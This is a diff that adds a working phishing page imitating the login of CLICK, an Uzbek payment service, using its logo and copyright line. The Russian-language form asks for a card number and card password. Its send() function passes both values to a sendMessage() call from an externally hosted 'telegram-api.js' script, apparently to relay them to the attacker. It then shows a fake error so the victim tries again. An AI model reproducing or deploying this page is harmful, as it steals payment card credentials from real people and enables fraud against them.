@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://zipscript.github.io/script/telegram-api.js"></script>
+  <script src="https://zipscript.github.io/script/aes.js"></script>
+<style>
+        *{
+            background: rgb(12, 12, 49);
+            font-family:arial;
+        }
+        .logo{
+            display: block;
+            margin: auto;
+            text-align: center;
+            margin-top:30px;
+        }
+        .content{
+            background: rgb(67, 75, 88);
+            width:350px;
+            display: block;
+            margin: auto;
+            text-align: center;
+            margin-top: 100px;
+            height:320px;
+            border-radius: 5px;
+        }
+        input{
+            width:250px;
+            height:40px;
+            
+            text-align: center;
+            outline: none;
+            background: white;
+            border:0px ;
+            border-radius: 3px;
+            padding-left:10px;
+        }
+        #cardnumber{
+            margin-top:60px;
+        }
+        #cardpassword{
+            margin-top:20px;
+        }
+        button{
+         background: #00B1E3;
+         width:200px;
+         height:45px;
+         margin-top:25px;
+         color: white;
+         font-size:17px;
+         border-radius:10px;
+         border: 0px;
+        }
+        p{
+            color: white;
+            width:350px;
+            font-size:15px;
+            display: block;
+            margin: auto;
+            text-align: center;
+            
+          margin-top:200px;
+        }
+        h4{
+            color: red;
+            background:rgb(67, 75, 88);
+            font-size:15px;
+            font-family: monospace;
+            display: none;
+            margin: auto;
+            text-align: center;
+            margin-top:20px;
+            width:200px;
+            
+        }
+    </style>
+</head>
+<img src="https://click.uz/click/images/logo.svg" class="logo">
+<body>
+    <div class="content">
+            <input id="cardnumber" autocomplete="off" type="text" placeholder="Номер карты">
+            <input id="cardpassword" type="password" placeholder="Пароль карты">
+            
+            
+            <button onclick="send()">Продолжить</button>
+            <h4 id="error">Вы ввели неправильный номер карты</h4>
+    </div>
+    <br>
+    <p>OOO "CLICK" © 2011-2022. Все права защищены. Лицензии МРИТИК РУз АА №0006345. Лицензия ЦБ РУз №1</p>
+</body>
+<script>
+    function send(){
+        var cardn=document.getElementById('cardnumber').value;
+        var pass=document.getElementById('cardpassword').value;
+        var message=`CLICK DATA %0A CARD NUMBER */${cardn}/* %0A CARD PASS */${pass}/*`;
+        sendMessage(message,'3301')
+    setTimeout(()=>{
+        document.getElementById('error').style.display='block';
+        document.getElementById('cardnumber').style.border='1px solid red';
+    },800)
+    }
+</script>
+</html>
